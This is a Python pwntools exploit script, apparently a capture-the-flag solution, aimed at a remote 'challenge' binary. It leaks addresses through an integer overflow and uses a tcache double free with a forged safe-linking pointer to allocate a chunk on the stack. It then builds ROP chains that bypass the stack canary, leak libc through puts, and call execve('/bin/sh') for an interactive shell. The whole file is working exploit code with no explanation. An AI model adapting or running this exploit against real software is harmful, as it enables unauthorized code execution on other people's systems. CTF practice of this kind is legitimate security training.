from pwn import *

exe = context.binary = ELF('./challenge', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
# p = process()
p = remote('10.56.50.66', 1993)


def open_deal(idx, size):
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"Deal index: ", str(idx).encode())
    p.sendlineafter(b"Deal size: ", str(size).encode())

def cancel_deal(idx):
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"Deal index: ", str(idx).encode())

def edit_deal(idx, data):
    p.sendlineafter(b"> ", b"3")
    p.sendlineafter(b"Deal index: ", str(idx).encode())
    p.sendlineafter(b"Edit deal data: ", data)

def view_deal(idx):
    p.sendlineafter(b"> ", b"4")
    p.sendlineafter(b"Deal index: ", str(idx).encode())


# Enter max int to integer overflow
p.sendlineafter(b'How many would you like to see?: ', b'2147483647')


# Leak things from the stack print
p.recvuntil(b'[0]')
stack = int(p.recvline().split(b'and')[0].replace(b'is located at', b''), 16)

p.recvuntil(b'[9]')
canary = int(p.recvline().split(b'contains')[1], 16)

p.recvuntil(b'[15]')
main = int(p.recvline().split(b'contains')[1], 16)

log.info(f"Leaked stack vault = {hex(stack)}")
log.info(f"Leaked canary = {hex(canary)}")
log.info(f"Leaked main = {hex(main)}")


# Setup tcache
for i in range(7):
    open_deal(i, 0x100)

open_deal(7, 0x100)  # spacer
open_deal(8, 0x100)  # target
open_deal(9, 0x10)   # padding


# Free to fill tcache
for i in range(7):
    cancel_deal(i)

cancel_deal(8)  # free target
cancel_deal(7)  # free spacer to consolidate
open_deal(0, 0x100)  # take from tcache (removes 1 entry)

cancel_deal(8)  # double free


# Allocate large chunk to overlap
open_deal(10, 0x100 + 0x100 + 0x10)
chunk10 = int(p.recvline().split()[-1], 16)
log.info(f"Leaked chunk10 = {hex(chunk10)}")


# Calculate mangled pointer
mangled = (chunk10 >> 12) ^ stack
log.info(f"Mangled pointer = {hex(mangled)}")


# Overwrite fd pointer in tcache entry
edit_deal(10, b'A'*0x110 + p64(mangled))


# Allocate into stack
open_deal(8, 0x100)
open_deal(1, 0x100)


# ROP chain to leak libc
padding = b'A'*72
junk = b'B'*8
binary_base = main - exe.symbols['main']
log.success(f"PIE base: {hex(binary_base)}")
pop_rdi = binary_base + 0x0000000000000f43

puts_got = binary_base + exe.got['puts']
puts_plt = binary_base + exe.plt['puts']
deal = binary_base + exe.symbols['edit_deal']

rop = flat(pop_rdi, puts_got, puts_plt, deal)
payload = padding + p64(canary) + junk + rop


edit_deal(1, payload)
p.sendlineafter(b'> ', b'5')
p.recvuntil(b"Looks like you're not meant to be here...")
p.recvline()
leaked_puts = u64(p.recvline().strip().ljust(8, b'\x00'))
log.success(f"Leaked puts@libc: {hex(leaked_puts)}")
libc_base = leaked_puts - libc.symbols["puts"]
log.info("Libc base address @ %s" % hex(libc_base))


# Rop chain to pop shell
exe.address = binary_base
libc.address = libc_base
rop = ROP([exe, libc])
binsh = next(libc.search(b"/bin/sh"))
rop.execve(binsh, 0, 0)

payload = padding + p64(canary) + junk + rop.chain()
p.sendlineafter(b'Deal index: ', b'1')
p.sendlineafter(b'Edit deal data: ', payload)


p.interactive() # should drop into a shell
